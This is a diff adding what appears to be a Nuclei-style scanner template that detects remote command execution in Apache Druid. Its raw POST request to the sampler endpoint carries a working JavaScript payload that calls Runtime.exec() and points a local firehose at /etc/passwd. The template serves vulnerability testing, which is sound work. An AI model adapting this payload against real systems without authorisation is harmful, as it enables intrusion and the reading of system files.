@@ -1,0 +1,36 @@
+id: Apache-Druid-rce
+info:
+  author: Str1am
+  name: "Apache Druid\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C"
+  reference: https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md
+  severity: critical
+  tags: Druid,rce
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '999999987654'
+  matchers-condition: and
+  raw:
+  - "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
+    \n{\n   \"type\" : \"index\",\n   \"spec\" : {\n   \"dataSchema\" : {\n     \"\
+    dataSource\" : \"test\",\n     \"parser\" : {\n       \"type\" : \"string\",\n\
+    \       \"parseSpec\":{\n         \"format\" : \"javascript\",\n         \"timestampSpec\"\
+    \ : {\n           \"column\" : \"timestamp\",\n      \"missingValue\": \"2020-01-01T00:00:00Z\"\
+    \n          },\n          \"dimensionsSpec\" : {\n            \"dimensions\" :\
+    \ [\"page\",\"test\"]\n          },\n          \"function\" : \"function(str)\
+    \ { var parts = str.split(\\\"#\\\"); var input = java.lang.Runtime.getRuntime().exec('expr\
+    \ 999999999999 -  12345 ').getInputStream();var s = new java.util.Scanner(input).useDelimiter(\\\
+    \"\\\\\\\\A\\\");return { test: s.next() } }\",\n          \"\": {\n         \
+    \   \"enabled\": true\n          }\n        }\n      },\n      \"metricsSpec\"\
+    \ : [],\n      \"granularitySpec\" : {\n        \"segmentGranularity\": \"DAY\"\
+    \n      }\n    },\n    \"ioConfig\" : {\n      \"type\" : \"index\",\n      \"\
+    firehose\": {\n        \"type\": \"local\",\n        \"filter\"   : \"passwd\"\
+    ,\n        \"baseDir\"  : \"/etc\",\n        \"data\": \"1,1,1,1,1\"\n      }\n\
+    \    },\n    \"tuningConfig\" : {\n      \"type\" : \"index\",\n      \"maxNumConcurrentSubTasks\"\
+    \ :1,\n      \"forceGuaranteedRollup\" : false\n    }\n  }\n\n}\n"
